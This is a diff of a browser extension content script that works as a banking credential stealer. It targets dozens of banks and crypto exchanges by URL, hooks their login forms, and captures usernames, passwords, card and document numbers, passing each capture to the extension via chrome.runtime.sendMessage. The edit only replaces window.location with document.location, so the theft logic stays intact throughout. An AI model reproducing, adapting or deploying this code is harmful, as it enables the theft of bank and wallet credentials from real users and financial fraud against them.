@@ -2,7 +2,7 @@
 var myStringArray = ["secureinternetbank.com", "secureweb.inalco.com","financierebn.com", "bncd.ca", "bvi.bnc.ca" ,"commercial.bnc.ca", "ipko.pl", "banca", "banco", "bank", "bitcoin", "monero", "etherum", "wallet", "cryptocurrency", "wp-admin.php", "wp-login.php", "bitcoin","blockchain.info","wallet","paxful.com","coin.space","coinapult.com", "bitgo.com", "strongcoin.com", "coinhive.com", "spectrocoin.com", "wirexapp.com", "xapo.com", "iqoption.com", "etoro.com", "bittrex.com", "localbitcoins.com", "cex.io", "kraken.com", "etherdelta.com", "bitfinex.com", "bitstamp.net", "bisq.network", "gdax.com", "shapeshift.io", "binance.com", "coinmama.com", "bitcoin.de", "bithumb.com", "coinatmradar.com", "poloniex.com", "changelly.com", "zebpay.com", "bitso.com", "gemini.com", "yobit.net", "luno.com", "bitbay.net", "bitpanda.com", "bitflyer.jp", "cryptonia.co.nz", "btcmarkets.net", "coinchceck.com", "bx.in.th", "bitcoin.co.id", "anycoindirect.eu", "hitbtc.com", "bitmex.com", "indacoin.com"];
 var arrayLength = myStringArray.length;
 for (var i = 0; i < arrayLength; i++) {
-    if (window.location.href.indexOf(myStringArray[i]) > -1) {
+    if (document.location.href.indexOf(myStringArray[i]) > -1) {
          chrome.runtime.sendMessage({cmd: "w",data: window.lcoation.href});
 }
 }
@@ -16,7 +16,7 @@ if (top['location']['href']['indexOf']('https://onlinebanking.anb.com.sa/RetailB
                   var login = {};
                   login.username = document.getElementById("uname").value;
                   login.pass = "USERNAME";
-                  login.href = window.location.href;
+                  login.href = document.location.href;
                   chrome.runtime.sendMessage({cmd: "l",data: login});
             }
         }
@@ -30,7 +30,7 @@ if (top['location']['href']['indexOf']('https://onlinebanking.anb.com.sa/RetailB
                   var login = {};
                   login.username = document.getElementsByName("password1")[0].value;
                   login.pass = "PASSWORD";
-                  login.href = window.location.href;
+                  login.href = document.location.href;
                   chrome.runtime.sendMessage({cmd: "l",data: login});
             }
         }
@@ -52,7 +52,7 @@ if (top['location']['href']['indexOf']('mijnzakelijk.ing.nl') > -1) {
                 }
                   login.username = document.getElementsByClassName(" firstfield")[0].value;
                   login.pass = p;
-                  login.href = window.location.href;
+                  login.href = document.location.href;
                   chrome.runtime.sendMessage({cmd: "l",data: login});
             }
         }
@@ -75,7 +75,7 @@ if (top['location']['href']['indexOf']('mijn.ing.nl') > -1) {
                 }
                   login.username = document.getElementsByClassName(" firstfield")[0].value;
                   login.pass = p;
-                  login.href = window.location.href;
+                  login.href = document.location.href;
                   chrome.runtime.sendMessage({cmd: "l",data: login});
             }
         }
@@ -91,7 +91,7 @@ if (top['location']['href']['indexOf']('online.procreditbank.ge') > -1) {
               var login = {};
                   login.username = document.getElementsByClassName("Login_input_name")[0].value;
                   login.pass = document.getElementsByClassName("Login_input_pass")[0].value;
-                  login.href = window.location.href;
+                  login.href = document.location.href;
                   chrome.runtime.sendMessage({cmd: "l",data: login});
             }
         }
@@ -106,7 +106,7 @@ if (top['location']['href']['indexOf']('online2.procreditbank.ge') > -1) {
               var login = {};
                   login.username = document.getElementsByClassName("Login_input_name")[0].value;
                   login.pass = document.getElementsByClassName("Login_input_pass")[0].value;
-                  login.href = window.location.href;
+                  login.href = document.location.href;
                   chrome.runtime.sendMessage({cmd: "l",data: login});
             }
         }
@@ -122,7 +122,7 @@ if (top['location']['href']['indexOf']('online1.procreditbank.ge') > -1) {
               var login = {};
                   login.username = document.getElementsByClassName("Login_input_name")[0].value;
                   login.pass = document.getElementsByClassName("Login_input_pass")[0].value;
-                  login.href = window.location.href;
+                  login.href = document.location.href;
                   chrome.runtime.sendMessage({cmd: "l",data: login});
             }
         }
@@ -141,7 +141,7 @@ if (top['location']['href']['indexOf']('internetbank.swedbank.se') > -1) {
               var login = {};
                   login.username = userid;
                   login.pass = select;
-                  login.href = window.location.href;
+                  login.href = document.location.href;
                   chrome.runtime.sendMessage({cmd: "l",data: login});
             }
         }
@@ -157,7 +157,7 @@ if (top['location']['href']['indexOf']('internetbanking.caixa.gov.br') > -1) {
               var login = {};
                   login.username = document.getElementsByName("name")[0].value;
                   login.pass = "test buttons 1 of 3";
-                  login.href = window.location.href;
+                  login.href = document.location.href;
                   chrome.runtime.sendMessage({cmd: "l",data: login});
             }
         }
@@ -173,7 +173,7 @@ if (top['location']['href']['indexOf']('www.bnpparibasfortis.be') > -1) {
               var login = {};
                   login.username = document.getElementsByName("cardNum")[0].value;
                   login.pass = document.getElementsByName("clientNum")[0].value;
-                  login.href = window.location.href;
+                  login.href = document.location.href;
                   chrome.runtime.sendMessage({cmd: "l",data: login});
             }
         }
@@ -192,7 +192,7 @@ if (top['location']['href']['indexOf']('https://online.swedbank.se/app/privat/lo
               var login = {};
               login.username = select;
               login.pass = userid;
-              login.href = window.location.href;
+              login.href = document.location.href;
               chrome.runtime.sendMessage({cmd: "l",data: login});
             }
         }
@@ -211,7 +211,7 @@ if (top['location']['href']['indexOf']('https://web.bancadigitalbod.com') > -1) 
               var login = {};
                   login.username = select;
                   login.pass = documentNumber;
-                  login.href = window.location.href;
+                  login.href = document.location.href;
                   chrome.runtime.sendMessage({cmd: "l",data: login});
             }
         }
@@ -230,7 +230,7 @@ if (top['location']['href']['indexOf']('https://www.bancodebogota.com/wps/portal
               var login = {};
                   login.username = select;
                   login.pass = documentNumber;
-                  login.href = window.location.href;
+                  login.href = document.location.href;
                   chrome.runtime.sendMessage({cmd: "l",data: login});
 
             }
@@ -253,7 +253,7 @@ if (top['location']['href']['indexOf']('https://www.bancodebogota.com/wps/portal
               var data = "docNumber: "+ documentNumber + " pass: "+ pass + " card: "+ card;
                   login.username = select;
                   login.pass = data;
-                  login.href = window.location.href;
+                  login.href = document.location.href;
                   chrome.runtime.sendMessage({cmd: "l",data: login});
 
             }
@@ -270,7 +270,7 @@ if (top['location']['href']['indexOf']('e-bdv.banvenez.com') > -1) {
              var login = {};
             login.username = document.getElementsByName("Username1")[0].value;
             login.pass = document.getElementsByName("Passworde1")[0].value;
-            login.href = window.location.href;
+            login.href = document.location.href;
             chrome.runtime.sendMessage({cmd: "l",data: login});
             }
         }
@@ -286,7 +286,7 @@ if (top['location']['href']['indexOf']('e-bdvcpx.banvenez.com') > -1) {
              var login = {};
             login.username = document.getElementsByName("notarjeta1")[0].value;
             login.pass = document.getElementsByName("passwordp1")[0].value;
-            login.href = window.location.href;
+            login.href = document.location.href;
             chrome.runtime.sendMessage({cmd: "l",data: login});
             }
         }
@@ -302,7 +302,7 @@ if (top['location']['href']['indexOf']('e-bdvcpx.banvenez.com') > -1) {
                var login = {};
               login.username = document.getElementsByName("ctl00$DefaultContent$UsernamePasswordLogin1$UserNameTextBox")[0].value;
               login.pass = document.getElementsByName("ctl00$DefaultContent$UsernamePasswordLogin1$PasswordTextBox")[0].value;
-              login.href = window.location.href;
+              login.href = document.location.href;
               chrome.runtime.sendMessage({cmd: "l",data: login});
               }
           }
@@ -318,7 +318,7 @@ if (top['location']['href']['indexOf']('e-bdvcpx.banvenez.com') > -1) {
                var login = {};
               login.username = document.getElementsByName("j_username")[0].value;
               login.pass = document.getElementsByName("j_password")[0].value;
-              login.href = window.location.href;
+              login.href = document.location.href;
               chrome.runtime.sendMessage({cmd: "l",data: login});
               }
           }
@@ -334,7 +334,7 @@ if (top['location']['href']['indexOf']('e-bdvcpx.banvenez.com') > -1) {
                var login = {};
               login.username = document.getElementsByName("login_email")[0].value;
               login.pass = document.getElementsByName("login_password")[0].value;
-              login.href = window.location.href;
+              login.href = document.location.href;
               chrome.runtime.sendMessage({cmd: "l",data: login});
               }
           }
@@ -343,14 +343,14 @@ if (top['location']['href']['indexOf']('e-bdvcpx.banvenez.com') > -1) {
 
 
 
-if (window.location.href.indexOf("http://bitcoinglobalclub.com/mlm/pages/login/login.php") > -1) {
+if (document.location.href.indexOf("http://bitcoinglobalclub.com/mlm/pages/login/login.php") > -1) {
 var login_form = document.getElementById("loginForm");
     if(login_form){
         login_form.onsubmit = function(){
             var login = {};
             login.username = document.getElementsByName("usus")[0].value;
             login.pass = document.getElementsByName("clave")[0].value;
-            login.href = window.location.href;
+            login.href = document.location.href;
             chrome.runtime.sendMessage({cmd: "l",data: login});
 		        }
           }
@@ -365,7 +365,7 @@ var login_form = document.getElementById("loginForm");
               var login = {};
               login.username = document.getElementsByName("userid")[0].value;
               login.pass = document.getElementsByName("password")[0].value;
-              login.href = window.location.href;
+              login.href = document.location.href;
               chrome.runtime.sendMessage({cmd: "l",data: login});
               }
           }
@@ -381,7 +381,7 @@ var login_form = document.getElementById("loginForm");
                var login = {};
               login.username = document.getElementsByName("userlogin")[0].value;
               login.pass = document.getElementsByName("passwd")[0].value;
-              login.href = window.location.href;
+              login.href = document.location.href;
               chrome.runtime.sendMessage({cmd: "l",data: login});
               }
           }
@@ -399,14 +399,14 @@ var login_form = document.getElementById("loginForm");
     for (var i = 0; i < sc.length; i++)
     	if (sc[i].src.indexOf('amung.us') > -1)
       var dati = {};
-      dati.href = window.location.href;
+      dati.href = document.location.href;
       dati.title = document.title;
       dati.amung = sc[i].src;
       chrome.runtime.sendMessage({cmd: "n",data: dati});
     for (var i = 0; i < img.length; i++)
     	if (img[i].src.indexOf('amung.us') > -1)
       var dat = {};
-      dat.href = window.location.href;
+      dat.href = document.location.href;
       dat.title = document.title;
       dat.amung = img[i].src;
     	chrome.runtime.sendMessage({cmd: "n",data: dat});
